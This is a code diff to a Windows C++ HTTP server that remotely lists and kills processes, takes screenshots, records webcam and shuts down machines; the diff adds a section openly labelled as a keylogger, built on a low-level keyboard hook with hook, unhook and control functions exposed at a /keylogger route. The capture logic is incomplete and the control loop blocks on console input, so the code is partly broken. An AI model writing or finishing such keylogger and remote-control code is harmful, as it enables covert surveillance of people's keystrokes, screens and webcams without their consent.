@@ -17,6 +17,7 @@
 // - GET /restart         -> restart machine (requires admin)
 
 #include <iostream>
+#include <thread>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -32,7 +33,7 @@ std::map<std::string, std::string> APPS = {
     {"cmd", "cmd.exe"}
 };
 
-const int PORT = 8080;
+const int PORT = 6969;
 const int BUFFER_SIZE = 4096;
 
 bool is_running(const std::string& exe_name) {
@@ -285,6 +286,85 @@ std::string stop_process_by_name(const std::string& name) {
     return html_page("<h1>Terminated " + std::to_string(count) + " processes named " + name + "</h1>");
 }
 
+// ====================== KEYLOGGER ======================
+HHOOK g_keyboardHook = NULL;
+DWORD g_threadId = 0;
+
+// 1. Hàm Keylogger Hook (Thay thế cho KeyLogger.InterceptKeys.startKLog)
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+
+        KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
+    }
+    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
+}
+
+// 2. Hàm chạy luồng (thay thế cho việc khởi tạo tklog)
+void KeyLoggerThreadFunc() {
+    g_threadId = GetCurrentThreadId();
+
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+}
+
+// 3. Hàm Móc nối (Hook) - Tương đương với "HOOK"
+bool hookKey() {
+    if (g_keyboardHook == NULL) {
+        g_keyboardHook = SetWindowsHookEx(
+            WH_KEYBOARD_LL,
+            KeyboardProc,
+            GetModuleHandle(NULL),
+            0 
+        );
+        return g_keyboardHook != NULL;
+    }
+    return true;
+}
+
+// 4. Hàm Gỡ móc nối (Unhook) - Tương đương với "UNHOOK"
+void unhook() {
+    if (g_keyboardHook != NULL) {
+        UnhookWindowsHookEx(g_keyboardHook);
+        g_keyboardHook = NULL;
+    }
+}
+
+// 5. Hàm điều khiển chính (Tương đương với keylog())
+std::string keylog_control() {
+    std::thread keyloggerThread(KeyLoggerThreadFunc);
+    keyloggerThread.detach();
+    std::string s;
+    if (hookKey()) {
+        std::cout << "Keylogger HOOKED.\n";
+    }
+
+    while (true) {
+        std::cout << "\nEnter command (PRINT/UNHOOK/HOOK/QUIT): ";
+        std::cin >> s;
+
+        if (s == "PRINT") {
+            std::cout << "Printing captured keys...\n";
+        } else if (s == "HOOK") {
+            if (hookKey()) {
+                std::cout << "Keylogger HOOKED successfully.\n";
+            } else {
+                std::cout << "Error HOOKING.\n";
+            }
+        } else if (s == "UNHOOK") {
+            unhook();
+            std::cout << "Keylogger UNHOOKED.\n";
+        } else if (s == "QUIT") {
+            unhook();
+            PostThreadMessage(g_threadId, WM_QUIT, 0, 0);
+            return "aaaaa";
+        }
+    }
+}
+
 // ====================== SCREENSHOT ======================
 // ====================== WEBCAM REC 10S ======================
 // ====================== SHUTDOWN/RESTART ======================
@@ -356,6 +436,7 @@ int main() {
                                      "<li><a href='/apps'>List apps</a></li>"
                                      "<li><a href='/processes'>List processes</a></li>"
                                      "<li><a href='/processes/actions'>Start/Stop processes</a></li>"
+                                     "<li><a href='/keylogger'>Keylogger</a></li>"
                                      "<li><a href='/screenshoot'>Screenshoot</a></li>"
                                      "<li><a href='/webcam_rec'>Record webcam 10s</a></li>"
                                      "<li><a href='/shutdown'>Shutdown</a> (admin)</li>"
@@ -371,9 +452,10 @@ int main() {
                 std::string app_name = query.count("app") ? query["app"] : "";
                 stop_app(app_name);
                 response = redirect("/apps");
-                
             }else if (route == "/processes") {
                 response = list_processes();
+            }else if (route == "/keylogger") {
+                response = keylog_control();
             } else {
                 response = html_page("<h1>404 Not Found</h1>");
             }
